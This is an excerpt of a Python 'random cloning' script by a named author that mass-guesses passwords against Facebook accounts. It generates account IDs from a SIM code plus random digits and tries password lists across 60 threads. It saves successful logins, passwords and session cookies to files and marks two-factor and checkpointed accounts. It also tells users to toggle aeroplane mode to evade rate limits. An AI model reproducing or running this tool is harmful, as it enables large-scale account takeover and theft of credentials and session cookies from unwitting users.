...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, Forhad, Random, tools"')
def logo():
...
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : FORHAD HOSEN
 [{G}+{W}] GITHUB   : dx_forhad       
 [{G}+{W}] FACEBOOK : Md Forhad Hosen  
 [{G}+{W}] YOU TUBE : Forhad X X X                       
 [{G}+{W}] VERSION  :V/1.08
{40*"="}\x1b[1;97m""")
############------[ RANDOM NUM ]------#########
def Main():
...
def rmenu1():
	...
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mCLONIG SPEED SUPER FAST');print(f' [{G}•{W}] \033[1;37mUSE AEROPLANE MODE IN EVERY 5 MIN ');print(40*"=")
		for rngx in xode:
			id=code+rngx
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}FORHAD-XD{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[FORHAD-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "forhad,  ok,  id"');ok.append(id);open('/sdcard/FORHAD-LIYA-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[FORHAD-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/TKM-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[FORHAD-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp"');open('/sdcard/FORHAD-LIYA-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
